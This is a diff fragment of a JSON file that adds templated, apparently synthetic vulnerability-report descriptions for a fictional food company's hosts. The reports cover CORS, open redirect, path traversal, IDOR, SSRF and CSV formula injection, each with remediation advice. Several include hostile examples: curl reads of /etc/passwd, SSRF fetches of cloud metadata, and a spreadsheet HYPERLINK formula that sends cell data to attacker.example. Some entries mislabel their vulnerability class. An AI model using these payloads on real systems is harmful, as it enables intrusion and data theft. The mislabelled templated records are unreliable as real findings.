+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6391,7 +6438,8 @@
           "offset": "6d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6537,7 +6585,8 @@
           "offset": "7d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6651,7 +6700,8 @@
           "offset": "3d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6787,7 +6837,8 @@
           "offset": "9d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6919,7 +6970,8 @@
           "offset": "3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7063,7 +7115,8 @@
           "offset": "6d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7166,7 +7219,8 @@
           "offset": "3d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7302,7 +7356,8 @@
           "offset": "5d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7449,7 +7504,8 @@
           "offset": "6d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7569,7 +7625,8 @@
           "offset": "6d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7749,7 +7806,8 @@
           "offset": "5d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7909,7 +7967,8 @@
           "offset": "7d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8029,7 +8088,8 @@
           "offset": "17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8144,7 +8204,8 @@
           "offset": "8d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8253,7 +8314,8 @@
           "offset": "16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8388,7 +8450,8 @@
           "offset": "7d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8467,7 +8530,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8614,7 +8678,8 @@
           "offset": "6d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8742,7 +8807,8 @@
           "offset": "3d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8866,7 +8932,8 @@
           "offset": "8d 5h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9042,7 +9109,8 @@
           "offset": "6d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9190,7 +9258,8 @@
           "offset": "1d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9326,7 +9395,8 @@
           "offset": "9d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://erp.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9404,7 +9474,8 @@
           "offset": "1d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9543,7 +9614,8 @@
           "offset": "1d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://erp.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9631,7 +9703,8 @@
           "offset": "16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9775,7 +9848,8 @@
           "offset": "8d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9918,7 +9992,8 @@
           "offset": "6d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10006,7 +10081,8 @@
           "offset": "1d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10146,7 +10222,8 @@
           "offset": "3d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://erp.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10262,7 +10339,8 @@
           "offset": "2d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
